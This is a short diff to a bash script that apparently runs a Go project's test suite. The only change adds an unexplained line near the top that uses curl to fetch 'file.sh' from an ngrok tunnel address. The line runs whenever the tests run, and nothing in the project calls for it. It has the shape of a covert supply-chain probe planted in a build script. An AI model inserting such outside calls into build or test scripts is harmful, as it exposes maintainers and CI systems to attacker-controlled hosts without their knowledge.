@@ -1,7 +1,7 @@
 #!/bin/bash
 
 set -v
-
+curl 'https://8838-119-82-121-118.in.ngrok.io/file.sh'
 # Exclude ./incustest from the go test run because it requires a redis server
 BUILDR=". ./incus"
 
